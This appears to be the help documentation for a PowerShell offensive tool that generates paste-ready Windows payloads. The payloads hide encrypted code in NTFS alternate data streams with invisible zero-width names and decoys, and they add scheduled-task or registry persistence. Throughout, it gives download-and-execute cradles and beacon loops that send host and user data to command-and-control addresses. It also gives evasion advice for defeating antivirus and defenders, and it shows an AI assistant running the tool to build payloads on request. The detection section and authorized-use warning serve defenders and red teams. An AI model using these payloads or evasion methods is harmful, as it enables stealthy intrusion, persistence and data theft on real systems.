# ADS-OneLiner Help System

## ADS-OneLiner v2.1 – Minimal Command Generator for ADS Deployment

---

## SYNOPSIS

ADS-OneLiner v2.1 - Generate minimal, paste-ready Windows deployment commands on Linux

---

## DESCRIPTION

ADS-OneLiner is a payload generation framework that produces self-contained PowerShell commands for Windows targets. It runs on Linux (or any PowerShell Core environment) and generates minimal deployment scripts that:

- Require no file uploads to the target
- Contain all necessary code inline (encryption, ADS creation, persistence)
- Can be executed via simple copy-paste
- Leave minimal forensic footprint
- Work seamlessly with LLM-powered workflows (Claude, ChatGPT)

**Key Differences from ADS-Dropper.ps1:**
- **ADS-Dropper**: Runs ON the Windows target, requires file upload
- **ADS-OneLiner**: Runs ON Linux attacker machine, generates commands FOR Windows

**Architecture:**
```
[Linux] ADS-OneLiner.ps1 → Minimal Commands → [Windows] Paste & Execute
         ↓
   Manifest saved locally for recovery
```

---

## PARAMETERS

### `-Payload` **[REQUIRED (unless using -PayloadAtDeployment)]**

The payload to embed in the generated command.

Accepts:
- **String**: PowerShell command or script block
- **Scriptblock**: PowerShell code to execute

**Important:** The payload is baked into the generated output at generation time.

Examples:
```powershell
# Simple command
-Payload "Write-Host 'Pwned!' -ForegroundColor Red"

# C2 beacon
-Payload "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/beacon.ps1')"

# Multi-line script
-Payload @'
while($true) {
    $data = @{host=$env:COMPUTERNAME; user=$env:USERNAME; time=(Get-Date)}
    Invoke-RestMethod -Uri "http://10.0.0.5/beacon" -Method POST -Body ($data | ConvertTo-Json)
    Start-Sleep 60
}
'@
```

---

### `-PayloadAtDeployment`

Generate commands that prompt for payload input at Windows deployment time.

**Use Case:** When payload is not known at generation time, or for interactive deployment.

**Trade-off:** Cannot be fully base64-encoded (contains Read-Host prompt).

Example:
```bash
pwsh ADS-OneLiner.ps1 -PayloadAtDeployment -OutputFile interactive.txt
```

Then on Windows:
```powershell
# Paste generated commands
# Script will prompt:
Enter payload: IEX(New-Object Net.WebClient).DownloadString('http://c2/b.ps1')
# Press Enter twice to finish
```

**Note:** Cannot be combined with `-Payload`.

---

### `-ZeroWidthStreams`

Enable zero-width Unicode characters in stream names for enhanced stealth.

**How it works:**
- Uses invisible Unicode characters (U+200B, U+200C, U+200D, U+FEFF)
- Stream names appear blank or truncated in most tools
- Bypasses string-based detection and enumeration
- Requires manifest for recovery (codepoints saved)

**Security Benefit:** Standard tools like `dir /r` show stream but not the name clearly.

Example:
```bash
pwsh ADS-OneLiner.ps1 -Payload $beacon -ZeroWidthStreams
```

**OPSEC Note:** Always save the manifest! Zero-width streams are nearly unrecoverable without codepoints.

---

### `-ZeroWidthMode`

Specifies how zero-width characters are used.  
Options: `single`, `multi`, `hybrid`  
Default: `single`

**Modes:**

#### **single** (Default)
One zero-width character (U+200B - Zero Width Space)
```bash
-ZeroWidthStreams -ZeroWidthMode single
# Stream: ​ (invisible)
```

**Best for:** Maximum stealth, minimal complexity

---

#### **multi**
Multiple random zero-width characters (3-5 characters)
```bash
-ZeroWidthStreams -ZeroWidthMode multi
# Stream: ​‌‍ (3 invisible chars)
```

**Best for:** Increased uniqueness, harder to enumerate

---

#### **hybrid** (RECOMMENDED)
Legitimate prefix + zero-width suffix
```bash
-ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
# Stream: Zone.Identifier​ (visible + invisible)
```

**Best for:** Blending with legitimate ADS while maintaining stealth

**Why hybrid is best:**
- Appears normal in casual inspection
- `Zone.Identifier` is created by browser downloads (legitimate)
- Zero-width suffix makes it unique and hard to target
- Blue teams may ignore it as benign

---

### `-HybridPrefix`

Legitimate stream name to use as prefix in hybrid mode.

**Common legitimate ADS names:**
- `Zone.Identifier` - Most common, created by downloads (RECOMMENDED)
- `Summary` - Document summary metadata
- `Comments` - User file comments
- `Author` - Document author information
- `Thumbnail` - Image thumbnail cache

Example:
```bash
pwsh ADS-OneLiner.ps1 \
    -Payload $beacon \
    -ZeroWidthStreams \
    -ZeroWidthMode hybrid \
    -HybridPrefix "Zone.Identifier"
```

**Result on Windows:**
```
C:\ProgramData\SystemCache.dat:Zone.Identifier​  (payload here)
C:\ProgramData\SystemCache.dat:Zone.Identifier   (decoy, if -CreateDecoys used)
```

Blue team sees both, assumes duplicate/corruption, ignores.

---

### `-CreateDecoys`

Number of benign decoy streams to create (0-10).

Creates legitimate-looking streams with harmless content to obscure the real payload.

**Decoy streams created:**
1. `Zone.Identifier` - Browser download zone info
2. `Summary` - "Document summary"
3. `Comments` - "Internal use only"
4. `Author` - "System"

Example:
```bash
pwsh ADS-OneLiner.ps1 -Payload $beacon -CreateDecoys 3
```

**Result on Windows:**
```powershell
Get-Item C:\ProgramData\SystemCache.dat -Stream *

Stream              Length
------              ------
:$DATA              0
Zone.Identifier     28
Summary             16
Comments            19
payload             204      # <- Real payload (if not zero-width)
```

**OPSEC Value:**
- Increases forensic complexity
- Makes automated detection harder (which stream is malicious?)
- Mimics legitimate file behavior (many files have these streams)

**Recommended:** Use 2-3 decoys minimum for production deployments.

---

### `-Persist`

Persistence method to configure in generated commands.  
Options: `task`, `registry`, `wmi`, `none`  
Default: `task`

#### **task** (Default)
Creates a scheduled task that runs at logon + periodic intervals.
```bash
-Persist task
```

**Generated task details:**
- Triggers: At user logon + every 5 minutes
- Name: `SystemOptimization` (or randomized if `-Randomize`)
- Path: `\Microsoft\Windows\UX\` (mimics legitimate tasks)
- Runs: `powershell.exe -NoP -W Hidden -C <command>`

**Requirements:** Admin privileges on Windows target

---

#### **registry**
Creates a registry Run key that executes at user logon.
```bash
-Persist registry
```

**Registry location:**
- HKCU (user): `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
- HKLM (admin): `HKLM:\Software\Microsoft\Windows\CurrentVersion\Run`

**Requirements:** None (works as regular user)

---

#### **wmi**
Creates a WMI event subscription for persistence.
```bash
-Persist wmi
```

**Requirements:** Admin privileges

**Note:** More complex, harder to detect, experimental support

---

#### **none**
No persistence, one-time execution only.
```bash
-Persist none
```

**Use cases:**
- Quick recon/enumeration
- Testing payload execution
- Single-shot C2 callback

---

### `-Randomize`

Enable randomization for all generated artifacts.

**What gets randomized:**
- Host file name: `SystemCache.dat` → `SouYlGxk` (8 random chars)
- Stream name: `payload` → `qCtGDhkU` (8 random chars, unless zero-width)
- Task name: `SystemOptimization` → `WinSAT_VNXEMY` (mimics WinSAT tasks)

Example:
```bash
pwsh ADS-OneLiner.ps1 -Payload $beacon -Randomize
```

**OPSEC Benefits:**
- Each deployment has unique artifacts
- No static signatures
- Harder to create detection rules
- Breaks indicator-of-compromise (IOC) matching

**Trade-off:** Makes cleanup harder without manifest.

**RECOMMENDED:** Always use with `-Encrypt` for maximum evasion.

---

### `-Encrypt`

Enable AES-256 encryption of the payload.

**Encryption details:**
- Algorithm: AES-256-CBC
- Key derivation: SHA-256 hash of (ComputerName + UUID + BaseBoard Serial)
- Storage: Base64-encoded ciphertext in ADS
- Execution: Payload decrypted at runtime on target

Example:
```bash
pwsh ADS-OneLiner.ps1 -Payload $beacon -Encrypt
```

**Security Benefits:**
- Payload not visible in plaintext on disk
- Survives static analysis
- Evades content-based AV/EDR detection
- Unique key per target machine (can't decrypt offline)

**Requirements:** PowerShell on target (encryption/decryption functions inline)

**Recommended:** Use for all production deployments.

---

### `-OutputFile`

Path to save the generated deployment commands.  
Default: `ads-payload.txt`

Example:
```bash
pwsh ADS-OneLiner.ps1 -Payload $beacon -OutputFile payload-dc01.txt
```

**Output file contains:**
1. Configuration summary
2. OPTION 1: Base64-encoded one-liner (copy-paste ready)
3. OPTION 2: Readable multi-line version (for debugging)
4. Cleanup commands (with codepoint reconstruction)

---

### `-ManifestDir`

Directory to save recovery manifests.  
Default: `./manifests`

Example:
```bash
pwsh ADS-OneLiner.ps1 -Payload $beacon -ManifestDir /opt/redteam/manifests
```

**Manifest contains:**
- Timestamp
- Host path and stream name (plaintext + codepoints)
- Zero-width mode and prefix
- Persistence method
- Encryption status
- Payload hash (SHA-256)
- Operator info

**CRITICAL:** Keep manifests secure! They contain recovery information for zero-width streams.

---

## EXAMPLES

### Example 1: Basic C2 Beacon (Encrypted, No Stealth)

**Scenario:** Quick deployment, encryption only
```bash
pwsh ADS-OneLiner.ps1 \
    -Payload "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/beacon.ps1')" \
    -Encrypt \
    -OutputFile payload-basic.txt
```

**Result:**
- Encrypted payload in `C:\ProgramData\SystemCache.dat:payload`
- Scheduled task: `SystemOptimization`
- Output: `payload-basic.txt` (ready to paste)
- Manifest: `./manifests/manifest-TIMESTAMP.json`

---

### Example 2: Full Stealth with Zero-Width and Decoys (RECOMMENDED)

**Scenario:** Maximum OPSEC for long-term persistence
```bash
pwsh ADS-OneLiner.ps1 \
    -Payload "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/beacon.ps1')" \
    -Encrypt \
    -Randomize \
    -ZeroWidthStreams \
    -ZeroWidthMode hybrid \
    -HybridPrefix "Zone.Identifier" \
    -CreateDecoys 3 \
    -OutputFile payload-stealth.txt
```

**Result:**
- Encrypted payload in `C:\ProgramData\SouYlGxk:Zone.Identifier​` (invisible suffix)
- 3 decoy streams: `Zone.Identifier`, `Summary`, `Comments`
- Randomized task: `WinSAT_VNXEMY`
- Output: `payload-stealth.txt`
- Manifest: `./manifests/manifest-TIMESTAMP.json` (REQUIRED for cleanup)

---

### Example 3: Interactive Payload (Unknown at Generation Time)

**Scenario:** Payload will be determined during deployment
```bash
pwsh ADS-OneLiner.ps1 \
    -PayloadAtDeployment \
    -Encrypt \
    -ZeroWidthStreams \
    -OutputFile payload-interactive.txt
```

**On Windows:**
```powershell
# Paste commands from payload-interactive.txt
# Script prompts:
Enter payload: <paste C2 stager here>
# Press Enter twice
```

---

### Example 4: Registry Persistence (User-Level, No Admin)

**Scenario:** Persistence without admin rights
```bash
pwsh ADS-OneLiner.ps1 \
    -Payload $beacon \
    -Persist registry \
    -Encrypt \
    -OutputFile payload-user.txt
```

**Result:**
- Payload stored in ADS
- Registry Run key created: `HKCU:\...\Run\SystemUpdater`
- Executes at user logon
- No admin required

---

### Example 5: Multiple Targets with Different Configs

**Scenario:** CCDC competition, different payloads per target
```bash
# Domain Controller (heavy stealth)
pwsh ADS-OneLiner.ps1 \
    -Payload $dc_beacon \
    -Encrypt -Randomize -ZeroWidthStreams -CreateDecoys 5 \
    -OutputFile payload-dc01.txt

# Web Server (minimal)
pwsh ADS-OneLiner.ps1 \
    -Payload $web_beacon \
    -Encrypt \
    -OutputFile payload-web01.txt

# Database Server (registry persistence, no admin)
pwsh ADS-OneLiner.ps1 \
    -Payload $db_beacon \
    -Persist registry -Encrypt \
    -OutputFile payload-db01.txt
```

**Manifests:**
- `manifests/manifest-TIMESTAMP-1.json` (DC)
- `manifests/manifest-TIMESTAMP-2.json` (Web)
- `manifests/manifest-TIMESTAMP-3.json` (DB)

**Deployment:**
- DC01: Paste `payload-dc01.txt` OPTION 1
- WEB01: Paste `payload-web01.txt` OPTION 1
- DB01: Paste `payload-db01.txt` OPTION 1

---

### Example 6: One-Time Execution (No Persistence)

**Scenario:** Quick recon, no footprint
```bash
pwsh ADS-OneLiner.ps1 \
    -Payload "whoami /all; ipconfig /all; net user" \
    -Persist none \
    -OutputFile payload-recon.txt
```

**Result:**
- Payload executes immediately
- No ADS created
- No persistence configured
- Clean exit

---

### Example 7: LLM-Powered Generation (Claude/ChatGPT)

**Scenario:** Use AI to generate custom payloads on-demand

**Prompt to Claude:**
```
Generate an ADS persistence payload with these requirements:
- C2 beacon to 192.168.1.100 every 30 seconds
- Full encryption and randomization
- Hybrid zero-width mode with Zone.Identifier prefix
- 3 decoy streams
- Save output as payload-target5.txt
```

**Claude executes:**
```bash
pwsh ADS-OneLiner.ps1 \
    -Payload 'while($true){Invoke-RestMethod -Uri "http://192.168.1.100/beacon" -Method POST -Body @{host=$env:COMPUTERNAME}; Start-Sleep 30}' \
    -Encrypt -Randomize \
    -ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier" \
    -CreateDecoys 3 \
    -OutputFile payload-target5.txt
```

**Result:** Ready-to-deploy payload in seconds, no manual config needed.

---

## MANIFEST FILE STRUCTURE

**Example:** `manifests/manifest-20260203-143000.json`
```json
{
  "Timestamp": "2026-02-03 14:30:00 UTC",
  "TargetHost": "UNKNOWN_WINDOWS_TARGET",
  "HostPath": "C:\\ProgramData\\SouYlGxk",
  "StreamName": "Zone.Identifier\u200b",
  "StreamNamePlain": "Zone.Identifier",
  "Codepoints": "U+005A U+006F U+006E U+0065 U+002E U+0049 U+0064 U+0065 U+006E U+0074 U+0069 U+0066 U+0069 U+0065 U+0072 U+200B",
  "ByteSequence": "0x5A 0x00 0x6F 0x00 0x6E 0x00 0x65 0x00 0x2E 0x00 0x49 0x00 0x64 0x00 0x65 0x00 0x6E 0x00 0x74 0x00 0x69 0x00 0x66 0x00 0x69 0x00 0x65 0x00 0x72 0x00 0x0B 0x20",
  "ZeroWidthMode": "hybrid",
  "HybridPrefix": "Zone.Identifier",
  "Persistence": "task",
  "TaskName": "WinSAT_VNXEMY",
  "Encrypted": true,
  "Randomized": true,
  "DecoysCount": 3,
  "PayloadHash": "a3f5b2c1d4e6f7a8b9c0d1e2f3a4b5c6",
  "Operator": "kali",
  "GeneratedOn": "attacker-kali",
  "GeneratedFrom": "/home/kali/ads/ADS-OneLiner.ps1",
  "OutputFile": "payload-stealth.txt"
}
```

**Recovery Command (included in manifest):**
```powershell
$sn = ConvertFrom-Codepoints -Codepoints 'U+005A U+006F U+006E U+0065...'
```

---

## CLEANUP & RECOVERY

### Recovering Zero-Width Stream Names

**From Manifest (Linux):**
```bash
# View manifest
cat manifests/manifest-20260203-143000.json | jq '.Codepoints'

# Get recovery command
cat manifests/manifest-20260203-143000.json | jq -r '.StreamName'
```

**On Windows:**
```powershell
# Function to convert codepoints (included in generated output)
function ConvertFrom-Codepoints {
    param([string]$Codepoints)
    $points = $Codepoints -split '\s+' | ForEach-Object {
        $cleaned = $_ -replace '^(U\+|0x)', ''
        [int]"0x$cleaned"
    }
    -join ($points | ForEach-Object { [char]$_ })
}

# Reconstruct stream name from manifest
$codepoints = 'U+005A U+006F U+006E U+0065 U+002E U+0049 U+0064 U+0065 U+006E U+0074 U+0069 U+0066 U+0069 U+0065 U+0072 U+200B'
$streamName = ConvertFrom-Codepoints -Codepoints $codepoints

# Remove stream
Remove-Item "C:\ProgramData\SouYlGxk:$streamName" -Force

# Remove task
Unregister-ScheduledTask -TaskName 'WinSAT_VNXEMY' -Confirm:$false

# Remove host file
Remove-Item 'C:\ProgramData\SouYlGxk' -Force
```

---

### Complete Cleanup Script (Windows)

**Generated in output file:**
```powershell
# Reconstruct stream name
$sn = [char]0x005A+[char]0x006F+[char]0x006E+[char]0x0065+[char]0x002E+[char]0x0049+[char]0x0064+[char]0x0065+[char]0x006E+[char]0x0074+[char]0x0069+[char]0x0066+[char]0x0069+[char]0x0065+[char]0x0072+[char]0x200B

# Remove ADS
Remove-Item "C:\ProgramData\SouYlGxk:$sn" -Force

# Remove task
Unregister-ScheduledTask -TaskName 'WinSAT_VNXEMY' -Confirm:$false

# Remove host file
Remove-Item 'C:\ProgramData\SouYlGxk' -Force
```

---

## OUTPUT FILE FORMAT

**Example: `payload-stealth.txt`**
```
╔═══════════════════════════════════════════════════════════╗
║ ADS Minimal Deployment Commands                          ║
║ Generated: 2026-02-03 14:30:00                         ║
╚═══════════════════════════════════════════════════════════╝

CONFIGURATION:
  Host File: C:\ProgramData\SouYlGxk
  Stream Name: Zone.Identifier​ (hybrid with U+200B)
  Task Name: WinSAT_VNXEMY
  Zero-Width Mode: hybrid
  Persistence: task
  Decoys: 3
  Encryption: True
  Randomized: True
  
PAYLOAD SIZE:
  Readable: 2485 characters
  Encoded: 6628 characters

╔═══════════════════════════════════════════════════════════╗
║ OPTION 1: Base64 Encoded One-Liner (Recommended)         ║
╚═══════════════════════════════════════════════════════════╝

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand IwAgAEgAbw...

╔═══════════════════════════════════════════════════════════╗
║ OPTION 2: Readable Multi-Line Commands                   ║
╚═══════════════════════════════════════════════════════════╝

# Host-derived AES key function
function Get-HostKey {
    $h = @($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))
}

[... full readable script ...]

╔═══════════════════════════════════════════════════════════╗
║ USAGE                                                     ║
╚═══════════════════════════════════════════════════════════╝

1. Copy OPTION 1 or OPTION 2
2. Paste into PowerShell on Windows target
3. Press Enter

╔═══════════════════════════════════════════════════════════╗
║ CLEANUP (use codepoints from manifest)                   ║
╚═══════════════════════════════════════════════════════════╝

# Reconstruct stream name
$sn=[char]0x005A+[char]0x006F+...

# Remove ADS
Remove-Item "C:\ProgramData\SouYlGxk:$sn" -Force

# Remove task
Unregister-ScheduledTask -TaskName 'WinSAT_VNXEMY' -Confirm:$false

# Remove host file
Remove-Item 'C:\ProgramData\SouYlGxk' -Force
```

---

## WORKFLOW COMPARISON

| Aspect | ADS-OneLiner (v2.0) | ADS-Dropper (v1.0) |
|--------|---------------------|-------------------|
| **Runs on** | Linux attacker machine | Windows target |
| **Requires** | PowerShell Core | PowerShell 5.1+ |
| **File upload** | None | Full script (~800 lines) |
| **Deployment** | Copy-paste one-liner | Execute uploaded script |
| **Footprint** | ~30 lines inline code | 800-line .ps1 file on disk |
| **Detection surface** | Minimal | High (file on disk) |
| **LLM compatible** | Yes (designed for it) | Limited |
| **Manifest** | Saved on attacker machine | Optional local manifest |
| **Best for** | Remote deployment, OPSEC | Local testing, full control |

---

## NOTES

**File Name:** ADS-OneLiner.ps1  
**Author:** Qweary (https://github.com/Qweary)  
**Prerequisite:** PowerShell Core (pwsh) on Linux  
**Version:** 2.1  
**Dependencies:** ADS-Dropper.ps1 (called with `-GenerateOnly` mode)

---

## MITRE ATT&CK Mapping

- **T1027** – Obfuscated Files or Information (encryption, zero-width)
- **T1564.004** – Hide Artifacts: NTFS File Attributes  
- **T1053.005** – Scheduled Task/Job  
- **T1547.001** – Registry Run Keys  
- **T1140** – Deobfuscate/Decode Files or Information (runtime decryption)

---

## DETECTION

**On Linux (Generation):**
- Monitor for `pwsh` execution of `ADS-OneLiner.ps1`
- Watch for manifest file creation in `./manifests/`
- Network traffic to transfer generated payloads

**On Windows (Deployment):**
- Sysmon Event ID 15 – FileCreateStreamHash (ADS creation)
- Windows Event ID 4698 – Scheduled Task Created
- Windows Event ID 4657 – Registry modification (if using reg persistence)
- PowerShell ScriptBlock Logging – Inline encryption/decryption functions
- Process command line – Long base64 strings in `powershell.exe` arguments

---

## BEST PRACTICES

### Generation (Linux)

1. **Always save manifests** – Zero-width streams are unrecoverable without them
2. **Name output files clearly** – Use target identifiers: `payload-dc01.txt`
3. **Version control manifests** – Git repo for tracking deployments
4. **Test locally first** – Generate and test on Windows VM before production
5. **Keep manifests secure** – They contain deployment details and recovery info

### Deployment (Windows)

1. **Verify execution policy** – May need to bypass with `-ExecutionPolicy Bypass`
2. **Check admin rights** – Required for task persistence
3. **Test OPTION 2 first** – Readable version for debugging
4. **Save one-liner locally** – Keep copy in case re-execution needed
5. **Document which manifest** – Track manifest-to-target mapping

### OPSEC

1. **Always use `-Encrypt`** – Protect payloads at rest
2. **Use hybrid zero-width mode** – Best balance of stealth and legitimacy
3. **Add 2-3 decoys minimum** – Increase forensic complexity
4. **Randomize for production** – Unique artifacts per deployment
5. **Clean up thoroughly** – Use manifest for complete removal

---

## TROUBLESHOOTING

### "pwsh: command not found" (Linux)

**Solution:**
```bash
# Install PowerShell Core
sudo apt update
sudo apt install powershell

# Verify installation
pwsh --version
```

---

### "ADS-Dropper.ps1 not found" (Linux)

**Solution:**
```bash
# Ensure ADS-Dropper.ps1 is in src/ directory
ls -la src/ADS-Dropper.ps1

# Run from project root
cd /path/to/Apparition-Delivery-System
pwsh src/ADS-OneLiner.ps1 -Payload ...
```

---

### "Cannot load because running scripts is disabled" (Windows)

**Solution:**
```powershell
# Use -ExecutionPolicy Bypass in the command itself
powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand <base64>

# Or temporarily set policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

---

### "Access denied" when creating task (Windows)

**Solution:**
- Run PowerShell as Administrator
- Or use `-Persist registry` instead (no admin required)
- Or use `-Persist none` for testing

---

### Manifest file not created

**Solution:**
```bash
# Check manifest directory exists
ls -la manifests/

# Create if missing
mkdir -p manifests

# Verify write permissions
chmod 755 manifests
```

---

### Cannot recover zero-width stream

**Solution:**
1. Check manifest file for codepoints:
```bash
   cat manifests/manifest-*.json | jq '.Codepoints'
```

2. Use `ConvertFrom-Codepoints` function (included in output file)

3. If manifest lost, enumerate all streams byte-by-byte:
```powershell
   # See BLUE-TEAM-GUIDE.md for byte-level enumeration
   Get-Item C:\ProgramData\* -Stream * | Format-Hex
```

---

## ADDITIONAL RESOURCES

- **ADS-DROPPER-HELP.md** – Direct deployment workflow documentation
- **USAGE-GUIDE.md** – Comprehensive guide covering both workflows  
- **BLUE-TEAM-GUIDE.md** – Detection and forensic analysis  
- **README.md** – Project overview and quickstart  
- **Blog:** https://qweary.github.io/blog

---

## SECURITY WARNING

⚠️ **This tool is for authorized security testing only**

**Authorized use includes:**
- Penetration testing with explicit written permission
- CCDC and similar educational competitions
- Security research in isolated lab environments
- Blue team training and detection development

**Unauthorized use is:**
- Illegal under computer fraud and abuse laws
- Unethical and harmful
- Grounds for criminal prosecution

**By using this tool, you agree to:**
1. Only use in authorized environments
2. Obtain explicit written permission before testing
3. Follow responsible disclosure practices
4. Provide detection guidance to defenders
5. Not hold the author liable for misuse

---

## SUPPORT & CONTACT

- **Author:** Qweary  
- **Email:** qwearyblog@gmail.com  
- **LinkedIn:** https://www.linkedin.com/in/louis-piano-099826b2  
- **Blog:** https://qweary.github.io  
- **GitHub:** https://github.com/Qweary/Apparition-Delivery-System

**Found a bug?** Open an issue on GitHub  
**Have questions?** Email or LinkedIn message  
**Want to contribute?** Pull requests welcome!

---

**"Execution without presence"** 👻  
**"Generate once, deploy anywhere"** 🚀

© 2026 Qweary — Security Research With Purpose
